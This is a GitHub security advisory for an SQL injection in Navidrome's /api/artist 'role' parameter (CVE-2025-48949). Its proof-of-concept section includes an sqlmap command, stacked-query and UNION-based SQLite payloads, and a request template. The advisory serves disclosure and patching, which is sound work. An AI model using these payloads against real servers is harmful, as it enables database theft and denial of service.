# [H] Navidrome allows SQL Injection via role parameter

## Summary
Severity: High
Advisory: GHSA-5wgp-vjxm-3x2r
CVE: CVE-2025-48949
CWE: CWE-89
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-05-29
Source: https://github.com/advisories/GHSA-5wgp-vjxm-3x2r
Type: github-advisory

## Affected
- Go: `github.com/navidrome/navidrome` — affected >=0.55.0 <0.56.0

## Details
## 🛡 **Security Advisory: SQL Injection Vulnerability in Navidrome v0.55.2**

### **Overview**

This vulnerability arises due to improper input validation on the **`role`** parameter within the API endpoint **`/api/artist`**. Attackers can exploit this flaw to inject arbitrary SQL queries, potentially gaining unauthorized access to the backend database and compromising sensitive user information.

---

### **Details**

* **Vulnerable Component**:
  API endpoint → `/api/artist`
  Parameter → `role`

* **Vulnerability Type**:
  SQL Injection (stacked queries, UNION queries)

* **Database Affected**:
  SQLite (confirmed exploitation via SQLite-specific payloads)

* **Impact**:
  Successful exploitation allows an unauthenticated attacker to:

  * Execute arbitrary SQL commands
  * Extract or manipulate sensitive data (e.g., user records, playlists)
  * Potentially escalate privileges or disrupt service availability

---

### **Proof of Concept (PoC)**

**Example Exploit Command**:

```bash
sqlmap.py -r navi --level 5 --risk 3 -a --banner --batch --tamper charencode --dbms sqlite
```

**Sample Payloads**:

* **Stacked Queries**:

  ```
  http://navidrome/api/artist?_end=15&_order=ASC&_sort=name&_start=0&role=albumartist');SELECT LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))--
  ```

* **UNION-Based Query**:

  ```
  http://navidrome.local/api/artist?_end=15&_order=ASC&_sort=name&_start=0&role=albumartist') UNION ALL SELECT 92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,CHAR(113,98,118,98,113)||CHAR(113,84,86,119,114,71,106,104,90,118,120,104,79,66,104,108,121,106,70,68,90,113,104,117,67,98,113,67,103,84,71,120,119,119,117,121,81,76,100,71)||CHAR(113,120,112,106,113),92,92,92,92-- Mtny
  ```

**Example HTTP Request**:

```http
GET /api/artist?_end=15&_order=ASC&_sort=name&_start=0&role=albumartist* HTTP/2
Host: <TARGET HOST>
Cookie: <REPLACE WITH VALID COOKIE>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: application/json
X-Nd-Authorization: <REPLACE WITH AUTH TOKEN>
X-Nd-Client-Unique-Id: <REPLACE WITH CLIENT ID>
```

---

## References
- https://github.com/navidrome/navidrome/security/advisories/GHSA-5wgp-vjxm-3x2r
- https://nvd.nist.gov/vuln/detail/CVE-2025-48949
- https://github.com/navidrome/navidrome/commit/b19d5f0d3e079639904cac95735228f445c798b6
- https://github.com/navidrome/navidrome
